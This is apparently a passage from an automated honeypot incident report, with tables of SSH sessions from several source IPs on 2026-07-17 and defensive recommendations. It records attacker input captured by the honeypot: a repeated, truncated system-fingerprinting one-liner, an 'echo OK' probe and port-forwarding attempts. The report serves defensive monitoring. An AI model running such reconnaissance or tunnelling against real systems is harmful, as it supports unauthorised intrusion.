| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:56:47` | `cowrie.session.connect` |
| `2026-07-17 05:56:47` | `cowrie.client.version` |
| `2026-07-17 05:56:47` | `cowrie.client.kex` |
| `2026-07-17 05:56:48` | `cowrie.login.success` |
| `2026-07-17 05:56:49` | `cowrie.session.params` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.success` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:49` | `cowrie.command.input` |
| `2026-07-17 05:56:50` | `cowrie.log.closed` |
| `2026-07-17 05:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27370a5fbb90

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-07-17 05:57 |
| **Last Seen** | 2026-07-17 05:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:57:52` | `cowrie.session.connect` |
| `2026-07-17 05:57:54` | `cowrie.client.version` |
| `2026-07-17 05:57:54` | `cowrie.client.kex` |
| `2026-07-17 05:57:56` | `cowrie.login.success` |
| `2026-07-17 05:57:57` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ece82c89a9e2

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-07-17 05:58 |
| **Last Seen** | 2026-07-17 05:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:58:02` | `cowrie.session.connect` |
| `2026-07-17 05:58:03` | `cowrie.client.version` |
| `2026-07-17 05:58:03` | `cowrie.client.kex` |
| `2026-07-17 05:58:05` | `cowrie.login.success` |
| `2026-07-17 05:58:05` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e88c0aaec99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:58 |
| **Last Seen** | 2026-07-17 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:58:32` | `cowrie.session.connect` |
| `2026-07-17 05:58:32` | `cowrie.client.version` |
| `2026-07-17 05:58:32` | `cowrie.client.kex` |
| `2026-07-17 05:58:33` | `cowrie.login.success` |
| `2026-07-17 05:58:34` | `cowrie.session.params` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.success` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.command.input` |
| `2026-07-17 05:58:34` | `cowrie.log.closed` |
| `2026-07-17 05:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8276af1fabd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:00 |
| **Last Seen** | 2026-07-17 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:00:21` | `cowrie.session.connect` |
| `2026-07-17 06:00:21` | `cowrie.client.version` |
| `2026-07-17 06:00:21` | `cowrie.client.kex` |
| `2026-07-17 06:00:22` | `cowrie.login.success` |
| `2026-07-17 06:00:24` | `cowrie.session.params` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.success` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.command.input` |
| `2026-07-17 06:00:24` | `cowrie.log.closed` |
| `2026-07-17 06:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35b8d78e5d0c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:02 |
| **Last Seen** | 2026-07-17 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:02:10` | `cowrie.session.connect` |
| `2026-07-17 06:02:11` | `cowrie.client.version` |
| `2026-07-17 06:02:11` | `cowrie.client.kex` |
| `2026-07-17 06:02:11` | `cowrie.login.success` |
| `2026-07-17 06:02:12` | `cowrie.session.params` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.success` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:12` | `cowrie.command.input` |
| `2026-07-17 06:02:13` | `cowrie.log.closed` |
| `2026-07-17 06:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1e20f5ab42

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:03 |
| **Last Seen** | 2026-07-17 06:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:03:56` | `cowrie.session.connect` |
| `2026-07-17 06:03:56` | `cowrie.client.version` |
| `2026-07-17 06:03:56` | `cowrie.client.kex` |
| `2026-07-17 06:03:57` | `cowrie.login.success` |
| `2026-07-17 06:03:58` | `cowrie.session.params` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.success` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:58` | `cowrie.command.input` |
| `2026-07-17 06:03:59` | `cowrie.log.closed` |
| `2026-07-17 06:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0b2d86257e

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-07-17 06:04 |
| **Last Seen** | 2026-07-17 06:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:04:39` | `cowrie.session.connect` |
| `2026-07-17 06:04:40` | `cowrie.client.version` |
| `2026-07-17 06:04:40` | `cowrie.client.kex` |
| `2026-07-17 06:04:42` | `cowrie.login.success` |
| `2026-07-17 06:04:42` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299703b64921

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-07-17 06:04 |
| **Last Seen** | 2026-07-17 06:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:04:52` | `cowrie.session.connect` |
| `2026-07-17 06:04:53` | `cowrie.client.version` |
| `2026-07-17 06:04:53` | `cowrie.client.kex` |
| `2026-07-17 06:04:56` | `cowrie.login.success` |
| `2026-07-17 06:04:57` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2eb7982a2cf

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 06:05 |
| **Last Seen** | 2026-07-17 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:05:00` | `cowrie.session.connect` |
| `2026-07-17 06:05:00` | `cowrie.client.version` |
| `2026-07-17 06:05:00` | `cowrie.client.kex` |
| `2026-07-17 06:05:00` | `cowrie.login.success` |
| `2026-07-17 06:05:01` | `cowrie.session.params` |
| `2026-07-17 06:05:01` | `cowrie.command.input` |
| `2026-07-17 06:05:01` | `cowrie.log.closed` |
| `2026-07-17 06:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ed886e96c94

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:05 |
| **Last Seen** | 2026-07-17 06:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:05:36` | `cowrie.session.connect` |
| `2026-07-17 06:05:36` | `cowrie.client.version` |
| `2026-07-17 06:05:36` | `cowrie.client.kex` |
| `2026-07-17 06:05:37` | `cowrie.login.success` |
| `2026-07-17 06:05:39` | `cowrie.session.params` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.success` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.command.input` |
| `2026-07-17 06:05:39` | `cowrie.log.closed` |
| `2026-07-17 06:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f9ecfd8055

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:07 |
| **Last Seen** | 2026-07-17 06:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:07:14` | `cowrie.session.connect` |
| `2026-07-17 06:07:14` | `cowrie.client.version` |
| `2026-07-17 06:07:14` | `cowrie.client.kex` |
| `2026-07-17 06:07:15` | `cowrie.login.success` |
| `2026-07-17 06:07:16` | `cowrie.session.params` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.success` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.command.input` |
| `2026-07-17 06:07:16` | `cowrie.log.closed` |
| `2026-07-17 06:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d35b4cc7d1ec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:08 |
| **Last Seen** | 2026-07-17 06:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:08:53` | `cowrie.session.connect` |
| `2026-07-17 06:08:53` | `cowrie.client.version` |
| `2026-07-17 06:08:53` | `cowrie.client.kex` |
| `2026-07-17 06:08:54` | `cowrie.login.success` |
| `2026-07-17 06:08:56` | `cowrie.session.params` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.success` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.command.input` |
| `2026-07-17 06:08:56` | `cowrie.log.closed` |
| `2026-07-17 06:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ea4dc6da9c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:10 |
| **Last Seen** | 2026-07-17 06:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:10:33` | `cowrie.session.connect` |
| `2026-07-17 06:10:33` | `cowrie.client.version` |
| `2026-07-17 06:10:33` | `cowrie.client.kex` |
| `2026-07-17 06:10:35` | `cowrie.login.success` |
| `2026-07-17 06:10:37` | `cowrie.session.params` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.success` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.command.input` |
| `2026-07-17 06:10:37` | `cowrie.log.closed` |
| `2026-07-17 06:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d2a1428bcd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:12 |
| **Last Seen** | 2026-07-17 06:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:12:12` | `cowrie.session.connect` |
| `2026-07-17 06:12:12` | `cowrie.client.version` |
| `2026-07-17 06:12:12` | `cowrie.client.kex` |
| `2026-07-17 06:12:13` | `cowrie.login.success` |
| `2026-07-17 06:12:14` | `cowrie.session.params` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.success` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
| `2026-07-17 06:12:14` | `cowrie.command.input` |
